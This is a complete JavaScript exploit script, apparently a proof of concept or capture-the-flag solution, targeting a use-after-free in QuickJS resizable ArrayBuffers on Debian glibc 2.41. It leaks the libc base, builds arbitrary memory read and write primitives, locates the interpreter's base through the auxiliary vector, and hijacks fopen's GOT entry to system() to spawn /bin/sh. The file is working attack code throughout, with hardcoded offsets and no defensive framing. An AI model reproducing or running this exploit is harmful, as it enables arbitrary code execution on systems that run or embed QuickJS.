"use strict";

// Keep corrupted ArrayBuffers alive: if they get GC'd, quickjs will free(abuf->data)
// and crash because we've pointed it at arbitrary memory.
const KEEP = [];

// --- Offsets (Debian glibc 2.41, qjs PIE) ---
// unsorted bin fd pointer = main_arena + 0x60
const OFF_UNSORTED_FD = 0x1e7b20n;

// glibc internal variable holding argv pointer (from libc debug symbols)
const OFF_LIBC_ARGV = 0x1e86e0n;

// libc system()
const OFF_SYSTEM = 0x53110n;

// qjs relocation offset for fopen@GOT
const OFF_FOPEN_GOT = 0x10b340n;

// qjs ELF header e_phoff
const E_PH_OFF = 0x40n;
const AT_PHDR = 3n;

function leak_libc_base() {
  // size > tcache max so free goes to unsorted bin
  let ab = new ArrayBuffer(0x5000, { maxByteLength: 0x80000 });
  // create some heap noise after ab->data so realloc can't extend in place
  for (let i = 0; i < 8; i++) KEEP.push(new ArrayBuffer(0x1000));

  let ta = new BigUint64Array(ab);

  let mal = {
    valueOf() {
      // grow past mmap threshold to force realloc to move (freeing old chunk)
      ab.resize(0x40000);
      return 0x4141414141414141n; // expected: should not match fd pointer
    }
  };

  // stale ptr reads freed unsorted fd
  let leak = Atomics.compareExchange(ta, 0, mal, 0n);
  return leak - OFF_UNSORTED_FD;
}

function make_evil_ab(target_addr, byte_len) {
  // 0x38 bytes => malloc chunk size 0x50, same as sizeof(JSArrayBuffer)
  let rab = new ArrayBuffer(0x38, { maxByteLength: 0x80000 });
  let ta = new BigUint64Array(rab);
  // small barrier allocation (kept alive)
  let barrier = new ArrayBuffer(0x1000);

  let victim;
  let mal = {
    valueOf() {
      // force realloc to move (old 0x50 chunk freed to tcache)
      rab.resize(0x40000);
      // allocate ArrayBuffer: its JSArrayBuffer struct (0x38 bytes) should reuse the freed chunk
      victim = new ArrayBuffer(byte_len);
      return target_addr;
    }
  };

  // Overwrite victim->abuf->data at offset 0x10 (qword index 2)
  Atomics.exchange(ta, 2, mal);

  KEEP.push(victim, rab, ta, barrier);
  return victim;
}

function read64(addr) {
  return new BigUint64Array(make_evil_ab(addr, 0x2000))[0];
}

function write64(addr, val) {
  new BigUint64Array(make_evil_ab(addr, 0x2000))[0] = val;
}

function find_qjs_base_from_stack(argv_ptr) {
  // map the initial stack region starting at argv vector
  let ab = make_evil_ab(argv_ptr, 0x80000);
  let v = new BigUint64Array(ab);

  let i = 0;
  // argv[] ... NULL
  while (v[i] !== 0n) {
    i++;
    if (i > 0x4000) throw new Error('argv scan too long');
  }
  i++; // skip NULL

  // envp[] ... NULL
  while (v[i] !== 0n) {
    i++;
    if (i > 0x8000) throw new Error('envp scan too long');
  }
  i++; // skip NULL

  // auxv: (type,val) pairs
  for (let j = i; j < i + 0x4000; j += 2) {
    let t = v[j];
    let val = v[j + 1];
    if (t === 0n) break;
    if (t === AT_PHDR) {
      return val - E_PH_OFF;
    }
  }
  throw new Error('AT_PHDR not found');
}

import('std').then((std) => {
  // Stage 1: libc base
  let libc_base = leak_libc_base();

  // Stage 2: stack -> auxv -> qjs PIE base
  let argv_ptr = read64(libc_base + OFF_LIBC_ARGV);
  let qjs_base = find_qjs_base_from_stack(argv_ptr);

  // Stage 3: GOT hijack fopen -> system
  write64(qjs_base + OFF_FOPEN_GOT, libc_base + OFF_SYSTEM);

  // Stage 4: call std.open() => system("/bin/sh") and block in a shell reading stdin
  std.open("/bin/sh", "r");
});
